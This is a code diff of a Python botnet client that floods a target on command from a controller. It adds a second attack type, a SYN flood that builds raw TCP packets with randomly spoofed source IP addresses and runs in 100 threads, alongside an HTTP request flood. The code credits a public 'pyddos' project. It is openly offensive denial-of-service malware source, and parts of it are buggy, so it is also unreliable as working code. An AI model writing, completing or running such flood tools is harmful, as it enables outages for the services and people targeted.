@@ -5,6 +5,7 @@ import http.client
 import argparse
 import threading
 import select
+import struct
 from random import *
 import time
 
@@ -76,12 +77,14 @@ class Bot():
 					elif request[0] == 'startattk':          
 						self.attacking = True
 						if self.attack_type == 1:
-							for _ in range(100):										#creates 100 threeads that run a while True loop, but Bot can keep recv-ing
+							for _ in range(100):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
 								t = threading.Thread(target=self.attack1)	
 								t.start()
 
-						#if self.attack_type == 2:
-							#run attack #2
+						if self.attack_type == 2:
+							for _ in range(100):										#creates 100 threads that run a while True loop, but Bot can keep recv-ing
+								t = threading.Thread(target=self.attack2)	
+								t.start()
 					elif request[0] == 'stopattk':
 						self.attacking = False
 					else:
@@ -116,15 +119,12 @@ class Bot():
 		attack = RequestAttack(self.target_address)       
 		while self.attacking == True:							
 			attack.run()
-
 		
-	def attack2(self, host, port):
-                attack2 = SynFloodAttack(self.target_address, self.ip)
-                while self.attacking == True:
-                        attack2.run()
-		#spoof source IP? fake_ip()p
+	def attack2(self):
+		attack2 = SynFloodAttack(self.target_address)
+		while self.attacking == True:
+			attack2.run()
 
-		#do attack on host:port
 
 
 ''' Original code from: Author: ___T7hM1___ Github: http://github.com/t7hm1/pyddos   '''
@@ -198,10 +198,8 @@ class RequestAttack():
 			
 
 class SynFloodAttack():
-	def __init__(self,target,ip):
-		Thread.__init__(self)
+	def __init__(self, target: str):
 		self.target = target
-		self.ip = ip
 		self.psh = ''
 		
 	def checksum(self):
@@ -218,9 +216,19 @@ class SynFloodAttack():
 		s = ~s & 0xffff
 
 		return s
-	    
+
+	def fake_ip(self):
+		skip = '127'
+		rand = range(4)
+		for x in range(4):
+			rand[x] = randrange(0,256)
+		if rand[0] == skip:
+			fake_ip()
+		fkip = '%d.%d.%d.%d' % (rand[0],rand[1],rand[2],rand[3])
+		return fkip
+		
 	def Building_packet(self):
-                #ip header fields
+		#ip header fields
 		ihl = 5
 		version = 4
 		tos = 0
@@ -228,22 +236,22 @@ class SynFloodAttack():
 		id = 54321  #id of this packet
 		frag_off = 0
 		ttl = 64 #255
-		protocol = IPPROTO_TCP  #socket
+		protocol = socket.IPPROTO_TCP  #socket
 		check = 10
-		s_addr = inet_aton(self.ip) #socket -- this can be spoofed
-		d_addr= inet_aton(self.target) #socket
+		src_addr = socket.inet_aton(self.fake_ip()) #"source" - spoofed - converted to binary
+		dst_addr = socket.inet_aton(self.target) #destination - converted to binary
 
 		ihl_version = (version << 4) + ihl
-                #the ! in the pack format string means network order
-		ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, s_addr, d_addr)
+		#the ! in the pack format string means network order
+		ip_header = pack('!BBHHHBBH4s4s', ihl_version, tos, tot, id, frag_off, ttl, protocol, check, src_addr, dst_addr)
 
-                #tcp header fields
+		#tcp header fields
 		source = 54321 #source port -- 1234
 		dest = 80      #destination port
 		seq = 0
 		ack_seq = 0
 		doff = 5       #4 bit field, size of tcp header, 5 * 4 = 20 bytes
-                #tcp flags
+				#tcp flags
 		fin = 0
 		syn = 1
 		rst = 0
@@ -257,46 +265,42 @@ class SynFloodAttack():
 		offset_res = (doff << 4)
 		tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)
 
-                # the ! in the pack format string means network order
+		# the ! in the pack format string means network order
 		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, check, urg_prt)
 
-                #pseudo header fields
-		src_addr = inet_aton(self.ip) #socket
-		dst_addr = inet_aton(self.target) #socket
+		#pseudo header fields
+
 		placeholder = 0
-		protocol = IPPROTO_TCP #socket
 		tcp_length = len(tcp_header)
 
-		self.psh = pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol,tcp_length);
-		self.psh = self.psh + tcp_header;
+		self.psh = pack('!4s4sBBH', src_addr, dst_addr, placeholder, protocol,tcp_length)
+		self.psh = self.psh + tcp_header
 
 		tcp_checksum = self.checksum()
 
-                # make the tcp header again and fill in the correct checksum
+		# make the tcp header again and fill in the correct checksum
 		tcp_header = pack('!HHLLBBHHH', source, dest, seq, ack_seq, offset_res, tcp_flags, window, tcp_checksum, urg_prt)
 
-                #final full packet - syn packets do not have any data
+		#final full packet - syn packets do not have any data
 		packet = ip_header + tcp_header
 
 		return packet
 
 	def run(self):
-                sock = self.socket(AF_INET, SOCK_RAW, IPPROTO_TCP)
-                sock.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
-                #tell kernel not to put in headers since we are providing it
-                self.checksum().setsockopt(socket.IPPRONTO_IP, socket.IP_HDRINCL, 1)
-		packet=self.Building_packet()
+		self.sock1 = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.IPPROTO_IP) 
+		self.sock1.connect((self.target, 8080))
+		#self.sock1.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)   #tell kernel not to put in headers since we are providing it
+		packet=self.Building_packet()		
 		try:
-			self.lock.acquire()
-			self.sock.sendto(packet,(self.target,0))
+			self.sock1.send(packet)
+		except socket.timeout:
+			self.sock1.close()
 		except KeyboardInterrupt:
 			sys.exit(print('Canceled by user'))
 		except Exception as e:
 			print(e)
-		finally:
-			self.lock.release()
 			sys.exit()
-      
+	  
 ''' end of referenced code '''
 
 if __name__ == "__main__":
